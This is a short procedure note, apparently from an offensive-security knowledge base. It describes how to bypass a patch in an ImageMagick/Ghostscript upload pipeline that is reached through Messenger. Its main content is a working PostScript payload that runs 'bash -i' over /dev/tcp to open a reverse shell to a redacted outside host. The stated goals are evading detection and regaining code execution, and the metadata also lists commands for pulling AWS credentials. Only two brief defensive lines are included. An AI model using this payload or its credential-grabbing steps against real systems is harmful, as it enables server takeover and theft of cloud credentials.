---
tags:
  - bypass
  - rce
type: procedure
tools:
  - '[[tools/ImageMagick]]'
  - '[[tools/Ghostscript]]'
  - '[[tools/Netcat]]'
  - '[[tools/curl]]'
  - '[[tools/Facebook-Messenger]]'
  - '[[tools/bash]]'
  - '[[tools/python]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/postscript-python-reverse-shell]]'
  - '[[commands/whoami]]'
  - '[[commands/ls]]'
  - '[[commands/cat-readme]]'
  - '[[commands/curl-aws-metadata-role]]'
  - '[[commands/curl-aws-credentials]]'
  - '[[commands/postscript-bash-reverse-shell]]'
platforms:
  - Web
techniques:
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Unix Shell]]'
id: dcd955cd-f6e5-4391-8e77-5a0bc830cb36
created_at: '2025-12-11T06:10:32.130Z'
updated_at: '2025-12-11T06:10:32.130Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
---
# Bypass Initial Patch with Alternative Payload

## Summary

This procedure tests and bypasses an initial patch by using an alternative bash-based Postscript payload for reverse shell execution.

## Description

After initial remediation, upload a new payload that uses bash instead of Python to evade filters and re-establish shell access.

## Requirements

1. Access to upload endpoint post-patch
2. Listener on port 8080
3. Knowledge of patch details

## Defense

Defensive measures and detection strategies:

- Comprehensive payload scanning
- Update ImageMagick policies to block all interpreters

## Objectives

1. Evade detection mechanisms
2. Regain code execution
3. Demonstrate patch insufficiency

## Instructions

### Step 1: Upload Alternative Payload

**Context**: Create and upload the bash-based Postscript file.

**Command** ([[commands/postscript-bash-reverse-shell]]):
```postscript
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/██████████/8080 0>&1') currentdevice putdeviceprops
```

> This pipes to a bash command that connects back interactively.

### Step 2: Trigger and Receive

**Context**: Repeat triggering via Messenger to execute the new payload.

> Monitor for new shell connection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques

- [[Unix Shell]]

## Commands Used

- [[commands/postscript-bash-reverse-shell]]

## Tools Used

- [[tools/bash]]

## Tags

- bypass
- rce
